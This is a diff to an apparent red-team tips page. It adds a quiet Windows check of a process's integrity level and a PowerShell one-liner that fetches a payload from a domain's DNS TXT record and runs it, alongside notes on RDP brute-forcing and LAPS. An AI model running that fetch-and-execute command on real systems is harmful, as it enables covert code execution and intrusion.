@@ -80,4 +80,18 @@ nessus_report_download $id $fileid
 
 11\. Check the configuration of LAPS using a machine account per [@HackingLZ](https://twitter.com/hackinglz), as it was noted that configurations are often messed up for them.&#x20;
 
-12\. Your daily reminder that RDP local admin bruteforce has no ratelimiting.
+12\. Your daily reminder that RDP local admin bruteforce has no rate limiting.
+
+13\. If you have a shell on a Windows host and need to check if your process is high integrity without sounding alarms, you can issue the following check:
+
+```bash
+# >= high if file listing is shown
+CMD -> dir \windows\temp
+PowerShell --> ls \windows\temp
+```
+
+14\. A fun way to execte payloads is via a domains TXT record, the following command will run the provided payload:
+
+```bash
+powershell . (nslookup -q=txt parzival.sh)[-1]
+```
